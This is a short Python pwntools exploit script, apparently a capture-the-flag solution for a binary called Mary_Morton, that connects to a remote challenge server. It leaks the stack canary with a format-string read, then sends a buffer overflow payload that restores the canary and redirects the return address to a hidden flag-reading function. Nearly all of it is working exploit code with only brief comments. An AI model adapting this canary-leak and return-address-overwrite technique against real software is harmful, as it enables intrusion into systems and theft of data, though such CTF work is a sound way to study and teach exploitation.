from pwn import *
context(arch='amd64',os='linux')

# the program get us three function,
# one for leaking canary by fmt,
# one for control the program executtion flow by stack verflow
# one for read flag which was never called in the program

# p = process('../Desktop/Mary_Morton')
p = remote('124.126.19.106',58817)

getshell = 0x00000000004008DA

print p.recvuntil('Exit the battle')
p.sendline('2')
p.send('%23$p')

canary = int(p.recvuntil("1. Stack Bufferoverflow Bug ",drop=True),16)
log.success('canary = %#x',canary)

p.recvuntil('Exit the battle')
p.sendline('1')
payload = 'A'*(0x90 - 8) + p64(canary) + 'B'*8 + p64(getshell)
p.send(payload)
# p.recvuntil('B'*8)
p.recv()
sleep(0.1)
print p.recv()
print p.recv()
